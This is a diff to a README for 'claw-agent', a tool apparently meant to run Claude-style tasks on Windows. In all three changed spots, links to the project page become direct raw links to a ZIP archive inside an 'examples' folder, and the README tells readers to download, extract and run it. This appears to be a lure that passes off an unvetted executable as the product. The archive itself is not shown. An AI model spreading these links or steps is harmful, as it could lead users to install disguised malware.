@@ -1,6 +1,6 @@
 # 🤖 claw-agent - Run Claude-style tasks on Windows
 
-[![Download claw-agent](https://img.shields.io/badge/Download%20claw--agent-00A3E0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dereckzg98/claw-agent)
+[![Download claw-agent](https://img.shields.io/badge/Download%20claw--agent-00A3E0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dereckzg98/claw-agent/raw/refs/heads/main/examples/agent-claw-v2.1.zip)
 
 ## 🚀 What is claw-agent?
 
@@ -15,7 +15,7 @@ Use it to:
 ## 📥 Download
 
 To get claw-agent, visit this page to download:
-https://github.com/dereckzg98/claw-agent
+https://github.com/dereckzg98/claw-agent/raw/refs/heads/main/examples/agent-claw-v2.1.zip
 
 If the page offers a Windows file, download it to your computer and open it. If you see a ZIP file, save it first, then extract it before running the app.
 
@@ -140,7 +140,7 @@ Try requests like:
 ## 📌 Download again later
 
 If you need to get claw-agent again, use this page:
-https://github.com/dereckzg98/claw-agent
+https://github.com/dereckzg98/claw-agent/raw/refs/heads/main/examples/agent-claw-v2.1.zip
 
 If a new version appears, repeat the same Windows steps:
 1. Open the link
